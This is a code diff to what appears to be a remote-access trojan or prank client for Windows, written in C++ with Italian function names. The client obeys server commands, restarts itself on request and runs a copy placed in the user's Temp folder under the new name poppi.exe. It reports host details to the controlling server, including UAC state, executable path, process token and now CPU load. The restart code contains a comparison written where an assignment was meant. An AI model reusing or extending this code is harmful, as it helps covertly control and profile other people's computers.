@@ -28,6 +28,7 @@ char mes[500]={0};
 char Csimb[3]={0};
 char Cbott[3]={0};
 char ctsk[7]={0};
+char ver[50]="1.1.1";
 int simb=0;
 int bott=0;
 int LagCount=0;
@@ -56,6 +57,11 @@ void Lag();
 bool SocketConnected(SOCKET);
 void RandPixel();
 void DataInst();
+//functions to calculate and retrieve CPU Load information
+static float CalculateCPULoad();
+static unsigned long long FileTimeToInt64();
+float GetCPULoad();
+//functions to calculate and retrieve CPU Load information
 
 ///////////////////////////////////////////////////////////////MAIN
 
@@ -241,7 +247,21 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client restart."<<endl;
-				system("start SES.exe");//3RIF
+				
+				char bufferEXE[MAX_PATH];
+				char cmd[MAX_PATH]="start \"\" \"";
+				GetModuleFileName( NULL, bufferEXE, MAX_PATH );
+				for(int i=10;i<MAX_PATH;i++)
+				{
+					cmd[i]=bufferEXE[i-10];
+					if(cmd[i]=='e' && cmd[i-1]=='x' && cmd[i-2]=='e' && cmd[i-3]=='.')
+					{
+						cmd[i+1]=='\"';
+						i++;
+					}
+				}
+				system(cmd);
+				
 				v2=false;
 				v3=false;
 				v4=false;
@@ -748,7 +768,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\SES.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\poppi.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
@@ -874,6 +894,7 @@ void GETINFO(SOCKET s)
     HANDLE hToken=NULL;
     char wnd_title[256];
     char uac='f';
+    int CPU=(int)(GetCPULoad()*100);
 	
 	send(s,&uac,sizeof(uac),0);
 	
@@ -888,7 +909,6 @@ void GETINFO(SOCKET s)
 	GetModuleFileName(NULL,buff,MAX_PATH);
 	send(s,buff,sizeof(buff),0);
 	
-	char ver[50]="1.1.0";
 	send(s,ver,sizeof(ver),0);
 	
 	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
@@ -912,6 +932,9 @@ void GETINFO(SOCKET s)
     
     char Cdata[15]={0}; sprintf(Cdata,"%d",data);
     send(s,Cdata,sizeof(Cdata),0);
+    
+    char CCPU[20]={0}; sprintf(CCPU,"%d",CPU);
+    send(s,CCPU,sizeof(CCPU),0);
 	
 	return;
 }
@@ -1082,7 +1105,28 @@ void DataInst()
 		outfile.close();
 	}
 	
-	
-	
 	return;
+}
+
+static float CalculateCPULoad(unsigned long long idleTicks, unsigned long long totalTicks)
+{
+    static unsigned long long _previousTotalTicks = 0;
+    static unsigned long long _previousIdleTicks = 0;
+    unsigned long long totalTicksSinceLastTime = totalTicks - _previousTotalTicks;
+    unsigned long long idleTicksSinceLastTime = idleTicks - _previousIdleTicks;
+    float ret = 1.0f - ((totalTicksSinceLastTime > 0) ? ((float)idleTicksSinceLastTime) / totalTicksSinceLastTime : 0);
+    _previousTotalTicks = totalTicks;
+    _previousIdleTicks = idleTicks;
+    return ret;
+}
+
+static unsigned long long FileTimeToInt64(const FILETIME & ft)
+{
+    return (((unsigned long long)(ft.dwHighDateTime)) << 32) | ((unsigned long long)ft.dwLowDateTime);
+}
+
+float GetCPULoad()
+{
+    FILETIME idleTime, kernelTime, userTime;
+    return GetSystemTimes(&idleTime, &kernelTime, &userTime) ? CalculateCPULoad(FileTimeToInt64(idleTime), FileTimeToInt64(kernelTime) + FileTimeToInt64(userTime)) : -1.0f;
 }
